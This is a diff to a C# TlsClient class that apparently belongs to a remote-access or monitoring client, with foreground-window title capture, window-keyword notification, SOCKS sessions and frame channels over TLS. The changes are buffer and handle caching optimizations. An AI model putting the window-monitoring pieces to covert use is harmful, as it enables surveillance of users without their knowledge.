@@ -1,3 +1,4 @@
+using System.Buffers;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Http;
@@ -18,6 +19,7 @@ internal class TlsClient : IDisposable
     private SslStream? _ssl;
     private readonly string _host;
     private readonly int _port;
+    private readonly byte[] _lenBuf = new byte[4];
     private readonly string _instanceId = Guid.NewGuid().ToString("N").Substring(0, 8);
     private readonly HashSet<string> _socksInitiated = [];
 
@@ -956,6 +958,7 @@ internal class TlsClient : IDisposable
 
     private static string _lastActiveTitle = "";
     private static int _activeSkipCounter;
+    private static readonly System.Text.StringBuilder _activeWindowSb = new(256);
 
     // Window Notify
     private static volatile string[] _winNotifyKeywords = [];
@@ -970,9 +973,9 @@ internal class TlsClient : IDisposable
         {
             var hwnd = GetForegroundWindow();
             if (hwnd == 0) return _lastActiveTitle = "";
-            var sb = new System.Text.StringBuilder(256);
-            GetWindowTextW(hwnd, sb, 256);
-            return _lastActiveTitle = sb.ToString();
+            _activeWindowSb.Clear();
+            GetWindowTextW(hwnd, _activeWindowSb, 256);
+            return _lastActiveTitle = _activeWindowSb.ToString();
         }
         catch { return _lastActiveTitle = ""; }
     }
@@ -1086,6 +1089,8 @@ internal class TlsClient : IDisposable
     private long _lastDiskRead, _lastDiskWrite;
     private DateTime _lastDiskTs = DateTime.UtcNow;
     private bool _diskPrimed;
+    private nint[]? _diskHandlesCache;
+    private bool _diskHandlesCacheReady;
     private static readonly IntPtr INVALID_HANDLE = new(-1);
     private const uint GENERIC_READ = 0x80000000;
     private const uint FILE_SHARE_RW = 3; // FILE_SHARE_READ | FILE_SHARE_WRITE
@@ -1132,17 +1137,34 @@ internal class TlsClient : IDisposable
     {
         try
         {
+            // Open handles once and cache — CreateFileW on physical drives is expensive
+            if (!_diskHandlesCacheReady)
+            {
+                var handles = new System.Collections.Generic.List<nint>(8);
+                for (int d = 0; d < 8; d++)
+                {
+                    var h = CreateFileW($@"\\.\PhysicalDrive{d}", GENERIC_READ, FILE_SHARE_RW, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
+                    if (h == INVALID_HANDLE) break;
+                    handles.Add(h);
+                }
+                if (handles.Count == 0)
+                {
+                    // Fallback: volume C:
+                    var h = CreateFileW(@"\\.\C:", GENERIC_READ, FILE_SHARE_RW, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
+                    if (h != INVALID_HANDLE) handles.Add(h);
+                }
+                _diskHandlesCache = handles.ToArray();
+                _diskHandlesCacheReady = true;
+            }
+
             long totalRead = 0, totalWrite = 0;
             bool gotAny = false;
             var buf = System.Runtime.InteropServices.Marshal.AllocHGlobal(96);
             try
             {
-                // Aggregate all physical drives (stops at first gap in numbering)
-                for (int d = 0; d < 8; d++)
+                if (_diskHandlesCache != null)
                 {
-                    var h = CreateFileW($@"\\.\PhysicalDrive{d}", GENERIC_READ, FILE_SHARE_RW, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
-                    if (h == INVALID_HANDLE) break;
-                    try
+                    foreach (var h in _diskHandlesCache)
                     {
                         if (DeviceIoControl(h, IOCTL_DISK_PERFORMANCE, IntPtr.Zero, 0, buf, 96, out _, IntPtr.Zero))
                         {
@@ -1150,25 +1172,6 @@ internal class TlsClient : IDisposable
                             totalWrite += System.Runtime.InteropServices.Marshal.ReadInt64(buf, 8);
                             gotAny = true;
                         }
-                    }
-                    finally { CloseHandle(h); }
-                }
-                // Fall back to volume C: if physical drives require admin rights
-                if (!gotAny)
-                {
-                    var h = CreateFileW(@"\\.\C:", GENERIC_READ, FILE_SHARE_RW, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
-                    if (h != INVALID_HANDLE)
-                    {
-                        try
-                        {
-                            if (DeviceIoControl(h, IOCTL_DISK_PERFORMANCE, IntPtr.Zero, 0, buf, 96, out _, IntPtr.Zero))
-                            {
-                                totalRead  = System.Runtime.InteropServices.Marshal.ReadInt64(buf, 0);
-                                totalWrite = System.Runtime.InteropServices.Marshal.ReadInt64(buf, 8);
-                                gotAny = true;
-                            }
-                        }
-                        finally { CloseHandle(h); }
                     }
                 }
             }
@@ -1864,8 +1867,7 @@ internal class TlsClient : IDisposable
 
     private byte[] SerializePacket(Packet packet)
     {
-        var json = JsonSerializer.Serialize(packet, SeroJson.Default.Packet);
-        var jsonBytes = Encoding.UTF8.GetBytes(json);
+        var jsonBytes = JsonSerializer.SerializeToUtf8Bytes(packet, SeroJson.Default.Packet);
         var result = new byte[4 + jsonBytes.Length];
         BitConverter.GetBytes(jsonBytes.Length).CopyTo(result, 0);
         jsonBytes.CopyTo(result, 4);
@@ -1895,11 +1897,9 @@ internal class TlsClient : IDisposable
                 // ③ Both empty — wake immediately when either channel gets data
                 try
                 {
-                    using var linked = CancellationTokenSource.CreateLinkedTokenSource(ct);
-                    var ctrlWait  = _ctrlCh.Reader.WaitToReadAsync(linked.Token).AsTask();
-                    var frameWait = _frameCh.Reader.WaitToReadAsync(linked.Token).AsTask();
+                    var ctrlWait  = _ctrlCh.Reader.WaitToReadAsync(ct).AsTask();
+                    var frameWait = _frameCh.Reader.WaitToReadAsync(ct).AsTask();
                     await Task.WhenAny(ctrlWait, frameWait);
-                    linked.Cancel();
                 }
                 catch (OperationCanceledException) when (!ct.IsCancellationRequested) { }
             }
@@ -1937,11 +1937,9 @@ internal class TlsClient : IDisposable
                 // Nothing to write — flush once then wait for data on either output channel
                 await ssl.FlushAsync(ct);
 
-                using var linked = CancellationTokenSource.CreateLinkedTokenSource(ct);
-                var ctrlWait  = _ctrlOutCh.Reader.WaitToReadAsync(linked.Token).AsTask();
-                var frameWait = _frameOutCh.Reader.WaitToReadAsync(linked.Token).AsTask();
+                var ctrlWait  = _ctrlOutCh.Reader.WaitToReadAsync(ct).AsTask();
+                var frameWait = _frameOutCh.Reader.WaitToReadAsync(ct).AsTask();
                 await Task.WhenAny(ctrlWait, frameWait);
-                linked.Cancel();
             }
         }
         catch (OperationCanceledException) when (ct.IsCancellationRequested) { }
@@ -1957,28 +1955,33 @@ internal class TlsClient : IDisposable
     {
         if (_ssl == null) return null;
 
-        var lenBuf = new byte[4];
         int read = 0;
         while (read < 4)
         {
-            int n = await _ssl.ReadAsync(lenBuf.AsMemory(read, 4 - read), ct);
+            int n = await _ssl.ReadAsync(_lenBuf.AsMemory(read, 4 - read), ct);
             if (n == 0) return null;
             read += n;
         }
 
-        int length = BitConverter.ToInt32(lenBuf, 0);
+        int length = BitConverter.ToInt32(_lenBuf, 0);
         if (length <= 0 || length > 500 * 1024 * 1024) return null; // 500 MB max
 
-        var dataBuf = new byte[length];
-        read = 0;
-        while (read < length)
+        byte[] dataBuf = ArrayPool<byte>.Shared.Rent(length);
+        try
         {
-            int n = await _ssl.ReadAsync(dataBuf.AsMemory(read, length - read), ct);
-            if (n == 0) return null;
-            read += n;
+            read = 0;
+            while (read < length)
+            {
+                int n = await _ssl.ReadAsync(dataBuf.AsMemory(read, length - read), ct);
+                if (n == 0) return null;
+                read += n;
+            }
+            return JsonSerializer.Deserialize(Encoding.UTF8.GetString(dataBuf, 0, length), SeroJson.Default.Packet);
         }
-
-        return JsonSerializer.Deserialize(Encoding.UTF8.GetString(dataBuf), SeroJson.Default.Packet);
+        finally
+        {
+            ArrayPool<byte>.Shared.Return(dataBuf);
+        }
     }
 
     // ── Cert Pinning ───────────────────────────────
